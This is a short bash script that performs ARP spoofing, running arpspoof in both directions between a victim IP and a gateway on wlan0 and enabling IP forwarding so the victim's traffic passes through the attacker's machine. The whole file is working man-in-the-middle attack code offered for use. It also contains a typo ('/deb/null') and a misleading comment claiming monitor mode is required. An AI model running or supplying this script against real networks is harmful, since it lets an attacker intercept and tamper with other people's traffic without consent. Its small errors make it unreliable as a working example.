#!/bin/bash
#monitor mode needs to be enabled to run arpspoof
#takes input as victimIP gatewayIP

arpspoof -i wlan0 -t $1 $2 > /dev/null 2>&1 &

arpspoof -i wlan0 -t $2 $1 > /deb/null 2>&1 &

sysctl -w net.ipv4.ip_forward=1

echo "spoofing $1 as gateway $2"
read -p "type 'end' to end the spoof " input
if [ "$input" == "end" ]; then
	pkill arpspoof
	sysctl -w net.ipv4.ip_forward=0
fi
